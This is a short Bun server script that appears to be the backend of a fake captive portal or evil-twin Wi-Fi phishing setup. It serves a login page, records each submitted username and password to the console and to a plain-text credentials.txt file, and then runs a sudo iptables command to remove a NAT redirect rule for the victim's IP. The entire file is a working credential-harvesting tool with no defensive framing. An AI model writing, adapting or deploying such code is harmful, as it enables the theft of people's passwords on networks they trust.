import { serve, file, $} from "bun";

const server = serve({
  port: 3000,
  async fetch(req) {
    if (req.method === "POST") {
      const data = await req.formData();
      const username = data.get("username");
      const password = data.get("password");

      if (username && password) {
        console.log(`Username: ${username}, Password: ${password}`);
        Bun.write("credentials.txt", `${username}:${password}\n`, { append: true });

        const clientIp = req.headers.get('x-forwarded-for') || req.connection.remoteAddress;

        try {
          await $`sudo iptables -t nat -D PREROUTING -s ${clientIp} -p tcp --dport 80 -j ACCEPT`
        } catch (e) {
            console.error(e);
        }
      }

      return new Response("Success");
    }

    return new Response(file("./portal.html"));
  }
});

